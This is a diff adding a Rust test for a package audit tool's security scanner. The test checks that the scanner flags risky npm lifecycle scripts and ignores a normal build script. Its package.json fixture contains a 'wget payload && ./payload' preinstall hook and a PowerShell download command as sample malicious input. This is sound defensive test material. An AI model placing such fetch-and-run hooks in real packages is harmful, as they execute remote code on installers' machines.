@@ -70,3 +70,41 @@ fn audit_scan_detects_pnpm_dependency_lifecycle_scripts() {
     assert_eq!(scripts[0].script_type, ScriptType::Postinstall);
     assert_eq!(scripts[0].risk_level, RiskLevel::High);
 }
+
+#[test]
+fn security_scan_detects_required_warning_patterns_and_ignores_normal_scripts() {
+    let temp_dir = TempDir::new().unwrap();
+    std::fs::write(
+        temp_dir.path().join("package.json"),
+        r#"{
+            "name":"demo",
+            "scripts":{
+                "preinstall":"wget payload && ./payload",
+                "install":"powershell -Command Invoke-WebRequest https://example.com/payload",
+                "postinstall":"chmod +x install.sh",
+                "prepare":"node scripts/build.js"
+            }
+        }"#,
+    )
+    .unwrap();
+
+    let warnings = crate::audit_tool::security_scan(temp_dir.path()).unwrap();
+
+    assert_eq!(warnings.len(), 3);
+    assert!(warnings.iter().any(|warning| {
+        warning.risk_level == RiskLevel::Critical
+            && warning.reason.contains("download")
+            && warning.script_type == "preinstall"
+    }));
+    assert!(warnings.iter().any(|warning| {
+        warning.risk_level == RiskLevel::High && warning.script_type == "install"
+    }));
+    assert!(warnings.iter().any(|warning| {
+        warning.risk_level == RiskLevel::Medium && warning.script_type == "postinstall"
+    }));
+    assert!(
+        !warnings
+            .iter()
+            .any(|warning| warning.script_type == "prepare")
+    );
+}
